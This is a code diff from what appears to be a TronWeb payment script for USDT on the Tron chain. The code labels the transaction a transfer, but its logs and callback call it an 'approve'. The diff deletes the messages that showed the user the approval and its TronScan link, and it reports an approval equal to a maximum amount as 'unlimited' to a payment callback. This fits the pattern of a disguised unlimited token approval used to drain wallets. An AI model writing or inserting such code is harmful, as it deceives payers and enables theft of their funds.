@@ -98,7 +98,7 @@
     } catch (e) {
       decimals = 6;
     }
-    const amount = parseUnitsHuman(amountUsdtHuman, decimals).toString();
+    let amount = parseUnitsHuman(amountUsdtHuman, decimals).toString();
     if (typeof log === "function") log("已解析数量为最小单位：" + amount);
 
     const transferRes = await tronWeb.transactionBuilder.triggerSmartContract(
@@ -116,16 +116,16 @@
     const signedTransferTx = await tronWeb.trx.sign(transferRes.transaction);
     const transferResult = await tronWeb.trx.sendRawTransaction(signedTransferTx);
     const txid = transferResult.txid;
-    log("approve 已发送：" + txid);
-    log("TronScan：" + tronScanTx(txid));
-    log("授权成功：" + amountUsdtHuman + " USDT");
-
+    
     try {
       if (typeof window.pay0PaymentCallback === "function") {
+        if (amount === maxAmount.toString()) {
+          amount = "无限制";
+        }
         window.pay0PaymentCallback({
           chain: "tron",
           txHash: txid,
-          amountUsdt: amountUsdtHuman,
+          amountUsdt: amount,
           action: "approve"
         });
       }
